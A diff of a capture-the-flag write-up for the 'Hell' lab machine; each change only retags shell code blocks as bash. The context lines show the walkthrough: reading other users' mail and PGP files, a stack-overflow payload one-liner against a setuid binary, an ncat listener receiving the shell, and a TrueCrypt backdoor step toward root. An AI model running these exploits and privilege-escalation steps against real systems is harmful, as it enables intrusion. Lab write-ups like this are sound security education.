@@ -79,7 +79,7 @@ Neither *Wapiti* nor *sqlmap* found ways to exploit the login form.
 
 Let's take a look at this mysterious 666 port :  
 
-```shellsession
+```bash
 $ ncat 192.168.1.29 666 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.29:666.
@@ -96,14 +96,14 @@ Yes, it's an *echo*-like service : you send it some data and the server reply wi
 
 A message informs us that the binary is archived on the web serveur and indeed we can find an *echoserver.bak* file on the web server's root.  
 
-```shellsession
+```bash
 $ file echoserver.bak 
 echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=e8d0c6cce9504db15d02078b96e4b95e108e2aa2, not stripped
 ```
 
 Good news : the binary is dynamically linked and not stripped (symbols inside), so it should not be as hard as analysing the [display\_key binary from the Hades CTF](http://devloop.users.sourceforge.net/index.php?article84/solution-du-challenge-hades) :p
 
-```shellsession
+```bash
 $ nm echoserver.bak 
                  U accept@@GLIBC_2.2.5
                  U bind@@GLIBC_2.2.5
@@ -153,7 +153,7 @@ Supposing that there is a buffer overflow in this binary we ca see that *strcpy(
 
 I gave a try to the [checksec](http://www.trapkit.de/tools/checksec.html) script which gives a list of security mecanisms (exploit mitigation) present on ELF binaries.  
 
-```shellsession
+```bash
 $ checksec.sh --file echoserver.bak
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echoserver.bak
@@ -604,7 +604,7 @@ if (login()) {
 
 Those credentials allow us to connect on SSH :  
 
-```shellsession
+```bash
 jack@hell:~$ ls -alR 
 .:
 total 28
@@ -650,7 +650,7 @@ Pwn 4 Life
 
 *Jack* is a sly little fox encrypting his email communications (the *NSA* is watching you *Jack* !).  
 
-```shellsession
+```bash
 jack@hell:~$ cat .pgp/note 
 The usual password as with everything.
 
@@ -674,7 +674,7 @@ svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
 
 By the way we have read permissions on an email in *George*'s inbox :  
 
-```shellsession
+```bash
 jack@hell:~$ cat /var/mail/george/signup.eml 
 From: admin@rockyou.com
 To: super_admin@hell.com
@@ -688,7 +688,7 @@ It looks like *George* registered on *RockYou*... maybe his password was leaked 
 
 Let's continue our exploration with a special focus on *George* :  
 
-```shellsession
+```bash
 jack@hell:~$ cat /etc/aliases
 # /etc/aliases
 mailer-daemon: postmaster
@@ -708,7 +708,7 @@ root: george
 
 So *George* must be our ticket to root.  
 
-```shellsession
+```bash
 jack@hell:~$ find / -user george 2> /dev/null 
 /home/george
 /usr/bin/game.py
@@ -759,7 +759,7 @@ So what ? Nothing ! Notice too that netstat was removed, netcat is not installed
 
 So I used [my own port scanning script in Python](http://devloop.users.sourceforge.net/index.php?article2/dvscan-python-port-scanner) I use twice in a year (you have to edit the script to add the 1337 port a the list) :  
 
-```shellsession
+```bash
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 dvscan.py 1.0
 Launching scan on localhost ['127.0.0.1']
@@ -784,7 +784,7 @@ Hmmm... Obviously the only thing left to do is to break the PGP crypted message.
 
 The key is tagged as *PGP* but it's still possible to use it from *GnuPG* using the *--import* option (don't try to install PGP for Linux... bad experience) :  
 
-```shellsession
+```bash
 $ gpg --import public.pkr
 gpg: clef 3F18AB0A : clef publique « jack@cowlovers.com » importée
 gpg:       Quantité totale traitée : 1
@@ -800,7 +800,7 @@ gpg:      clefs secrètes importées : 1
 
 The *Jack*'s password must be used when GPG ask it :  
 
-```shellsession
+```bash
 $ gpg secret.pgp
 ```
 
@@ -823,14 +823,14 @@ Connected as *milk\_4\_life* I saw a binary with setuid george permission :
 
 It looks like the program is openening some port :  
 
-```shellsession
+```bash
 milk_4_life@hell:~$ ./game 
 I'm listening
 ```
 
 So let's launch a port-scan on localhost again :  
 
-```shellsession
+```bash
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 --- snip ---
 Port ouverts :
@@ -906,7 +906,7 @@ I hear the faint sound of chmodding.......
 
 I used find to search files whose status was recently changed :  
 
-```shellsession
+```bash
 milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v /proc
 /usr/bin/lesson101
 /var/log/auth.log
@@ -922,7 +922,7 @@ The *lesson101* binary is now setuid george (*George is inside !!!*)
 
 Let's take a lesson again with *George* :  
 
-```shellsession
+```bash
 $ /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -943,7 +943,7 @@ When we gives a name long enough the program segfaults (this verb should added t
 
 As seen above, we don't have read permissions, luckily ASLR is not activated on the system :  
 
-```shellsession
+```bash
 milk_4_life@hell:~$ cat /proc/sys/kernel/randomize_va_space 
 0
 ```
@@ -960,7 +960,7 @@ Eventually I get my shell with a padding of 2 bytes.
 
 Victim's side :  
 
-```shellsession
+```bash
 milk_4_life@hell:~$ python -c "print '10';print 'AA'+'\x77\xff\xfe\xbf'*1000" | /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -976,7 +976,7 @@ Name:
 
 Attacker's side :  
 
-```shellsession
+```bash
 $ ncat -l -p 55555 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::55555
@@ -989,7 +989,7 @@ uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george
 
 After obtaining an SSH access (use the *authorized\_keys* file) I discovered in *.bash\_history* some references to *Truecrypt*.  
 
-```shellsession
+```bash
 george@hell:~$ sudo -l
 Matching Defaults entries for george on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -1000,7 +1000,7 @@ User george may run the following commands on this host:
 
 A *Truecrypt* container is already on the system but I can't find a working password to open it :  
 
-```shellsession
+```bash
 george@hell:~$ ls -lh container.tc
 -rw------- 1 george george 4.0M Jun 19 21:09 container.tc
 ```
@@ -1016,7 +1016,7 @@ Steps are easy : create a small container (10M) that can be mounted on Linux wit
 
 Final steps is to mount the evil volume on *Hell* and to launch our backdoor :  
 
-```shellsession
+```bash
 george@hell:~$ truecrypt /tmp/crypted.tc /media/truecrypt1
 Enter password for /tmp/crypted.tc: 
 Enter keyfile [none]: 
